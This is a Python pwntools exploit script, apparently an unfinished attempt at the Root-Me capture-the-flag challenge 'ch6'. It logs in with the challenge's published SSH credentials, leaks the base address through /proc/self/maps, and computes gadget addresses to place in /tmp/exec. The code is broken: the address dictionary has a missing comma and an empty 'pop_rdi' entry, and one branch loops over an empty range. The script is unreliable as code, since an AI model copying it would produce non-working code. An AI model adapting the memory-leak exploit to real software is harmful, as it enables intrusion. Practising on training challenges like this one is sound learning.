#!/usr/bin/env python3

from pwn import * 
import sys
from time import sleep

def send(line):
    print("Sending: ", line.decode())
    target.sendline(line)
    sleep(0.2)


def pwn_it(guessed_address = 0x0):
    print(target.recv().decode())
    send(b"2")
    print(target.recv().decode())
    send(b"/proc/self/maps")
    line = target.recvline().decode().strip()
    print("Get: ",line)
    start_address = line.split()[0].split("-")[0]
    print("start address is:", start_address)
    offset = int("0x"+start_address, 16) 
    print("offset is (decimal):", offset)
    
    code = {'exit_prog' : 0x1cc0,
            'puts' : 0x202ee0
            'pop_rdi' : 
        }
    
    chose = 'puts'
    if chose not in code:
        print(chose, "not in", code)
        exit(1)

    print(f"To execute '{chose}' put {p64(offset + code[chose])} in /tmp/exec")
    print("Pausing pwning")

    execute_code = b"-8198"

    target.interactive()

    print("Restarting pwning")

    send(b"2")
    print(target.recv().decode())
    send(b"/tmp/exec")

    print(target.recv())
    send(execute_code)

    

    
    


if len(sys.argv) != 2:
    print("remote, local or plz_pwn ?")
    exit(1)

target = None
if sys.argv[1] == "remote":
    host = ssh(user="app-systeme-ch6",
           host="challenge03.root-me.org",
           port=2223,
           password="app-systeme-ch6")

    target = host.process("./ch6")

    pwn_it()
    target.interactive()
elif sys.argv[1] == "local":
    target = process("./ch6")
    #gdb.attach(target, gdbscript='b *display_file_content+278')
    gdb.attach(target, gdbscript='b *display_shifted_file_content+400')
    pwn_it()
    target.interactive()
elif sys.argv[1] == "plz_pwn":
    print("Doesn't defined")
    for i in range( 0x0 , 0x0 , 0x10 ): 
        target = None
        pwn_it(i)
        try: 
            target.recvline()
        except EOFError:
            pass
        except:
            target.interactive()
        else:
            target.interactive()
        target.kill()
else:
    print("remote, local or plz_pwn ?")
    exit(1)


